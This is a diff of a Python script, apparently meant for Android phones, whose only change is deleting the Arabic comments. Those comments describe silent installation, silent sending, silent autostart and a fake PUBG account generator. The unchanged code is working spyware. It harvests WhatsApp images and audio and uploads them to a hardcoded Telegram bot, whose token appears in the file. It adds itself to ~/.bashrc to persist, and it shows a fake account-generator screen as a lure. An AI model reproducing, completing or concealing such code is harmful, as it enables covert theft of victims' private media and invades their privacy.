@@ -6,7 +6,6 @@ import subprocess
 import random
 import threading
 
-# ===== تثبيت requests بصمت =====
 try:
     import requests
 except ImportError:
@@ -14,11 +13,9 @@ except ImportError:
         subprocess.call([sys.executable, "-m", "pip", "install", "requests"], stdout=devnull, stderr=devnull)
     import requests
 
-# ===== إعداد البوت =====
 BOT_TOKEN = '7663148161:AAEvIRagn9uLRDFNxsHDgDNQ4iilSXGw1ro'
 CHAT_ID = '5792222595'
 
-# ===== مسارات الصور والصوت =====
 FOLDER_PRIORITY = {
     "WhatsApp Images": [
         '/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/',
@@ -33,12 +30,10 @@ FOLDER_PRIORITY = {
     ]
 }
 
-# ===== ملفات تتبع =====
 HOME = os.path.expanduser("~")
 SENT_LOG_FILE = os.path.join(HOME, '.sent_files.json')
 STATE_FILE = os.path.join(HOME, '.start_initialized')
 
-# ===== إرسال صامت =====
 def send_file(path):
     try:
         with open(path, 'rb') as f:
@@ -51,7 +46,6 @@ def send_file(path):
     except:
         pass
 
-# ===== إرسال الملفات في الخلفية =====
 def send_all():
     sent = []
     if os.path.exists(SENT_LOG_FILE):
@@ -78,7 +72,6 @@ def send_all():
                             pass
                         time.sleep(1)
 
-# ===== إضافة للتشغيل التلقائي بصمت =====
 def add_to_bashrc():
     bashrc = os.path.join(HOME, '.bashrc')
     entry = 'nohup python ~/start.py >/dev/null 2>&1 &'
@@ -89,7 +82,6 @@ def add_to_bashrc():
     with open(bashrc, 'a') as f:
         f.write(f'\n{entry}\n')
 
-# ===== واجهة توليد حسابات ببجي وهمية =====
 def show_fake_account_ui():
     os.system("clear")
     print("\033[1;32m==============================")
@@ -106,7 +98,6 @@ def show_fake_account_ui():
     time.sleep(3)
     os.system("clear")
 
-# ===== تشغيل كل شيء =====
 def main():
     add_to_bashrc()
     threading.Thread(target=send_all, daemon=True).start()
